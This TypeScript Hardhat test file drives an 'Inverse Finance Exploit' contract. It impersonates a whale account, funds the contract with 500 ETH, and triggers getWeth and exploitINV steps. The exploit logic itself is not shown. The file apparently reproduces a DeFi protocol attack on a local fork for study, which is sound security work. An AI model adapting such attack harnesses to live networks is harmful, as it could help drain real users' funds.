import { deployments, ethers, network } from "hardhat";
import { Contract } from "ethers";
import { moveBlocks } from "../utils/move-blocks";

const WHALE_ADDRESS = "0x0a4c79cE84202b03e95B7a692E5D728d83C44c76";
let exploit: Contract;

describe("Inverse Finance Exploit", () => {
  before(async () => {
    await deployments.fixture("exploit");
    exploit = await ethers.getContract("Exploit");
  });

  it("Should exploit Inverse Finance", async () => {
    // Impersonate account that has enough eth for this exploit
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [WHALE_ADDRESS],
    });
    const whale = await ethers.getSigner(WHALE_ADDRESS);

    const depositTx = await whale.sendTransaction({
      to: exploit.address,
      value: ethers.utils.parseEther("500"),
    });
    await depositTx.wait(1);

    const getWethTx = await exploit.connect(whale).getWeth();
    await getWethTx.wait(1);

    const exploitTx = await exploit.connect(whale).exploitINV();
    await exploitTx.wait(1);

    await exploit.connect(whale).finalNums();
  });
});
